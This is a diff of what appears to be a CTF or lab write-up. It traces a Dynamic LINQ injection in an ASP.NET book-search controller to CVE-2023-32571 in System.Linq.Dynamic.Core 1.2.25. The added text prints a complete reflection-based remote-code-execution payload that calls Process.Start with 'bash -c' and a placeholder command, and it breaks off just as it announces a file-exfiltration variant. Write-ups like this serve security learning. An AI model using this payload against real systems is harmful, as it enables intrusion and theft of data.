@@ -15,7 +15,7 @@ ENTRYPOINT ["dotnet", "CRUD.dll"]
 ```
 [In Dockerfiles, an ENTRYPOINT instruction is used to set executables that will always run when the container is initiated.]
 
-In this wehn we search for the code for book searching functionality, we’ll find it in class BookController method Index:
+In this whenn we search for the code for book searching functionality, we’ll find it in class BookController method Index:
 ```
  public IActionResult Index(string searchString, int page = 1, int pageSize = 5)
     {
@@ -44,4 +44,19 @@ In this wehn we search for the code for book searching functionality, we’ll fi
         }
     }
 ```
-it directly concatenates our searchString GET parameter’s value into query.Where:
+It directly concatenates our searchString GET parameter’s value into query.Where:
+The Where method belongs to LINQ (Language Integrated Query).
+
+Language-Integrated Query (LINQ) is the name for a set of technologies based on the integration of query capabilities directly into the C# language. Traditionally, queries against data are expressed as simple strings without type checking at compile time or IntelliSense support. Furthermore, you have to learn a different query language for each type of data source: SQL databases, XML documents, various Web services, and so on. With LINQ, a query is a first-class language construct, just like classes, methods, and events. - https://learn.microsoft.com/en-us/dotnet/csharp/linq/
+
+If we Google something like “LINQ vulnerability”, we can see a blog post mentioned that dynamic LINQ injection could result in RCE  The vulnerability is CVE ID “CVE-2023-32571”acc to which LINQ version 1.0.7.10 to 1.2.25 is vulnerable to that vulnerability. 
+```"System.Linq.Dynamic.Core": "1.2.25"```
+Hence we found the vuln
+
+The paylaod given to bypass it is:
+```
+"".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredMethods.Where(it.Name == "CreateInstanceAndUnwrap").First().Invoke("".GetType().Assembly.DefinedTypes.Where(it.Name == "AppDomain").First().DeclaredProperties.Where(it.name == "CurrentDomain").First().GetValue(null), "System, Version = 4.0.0.0, Culture = neutral, PublicKeyToken = b77a5c561934e089; System.Diagnostics.Process".Split(";".ToCharArray())).GetType().Assembly.DefinedTypes.Where(it.Name == "Process").First().DeclaredMethods.Where(it.name == "Start").Take(3).Last().Invoke(null, "bash;-c <command-here>".Split(";".ToCharArray()))
+```
+
+Hence modifying to exfltrate our files:
+first
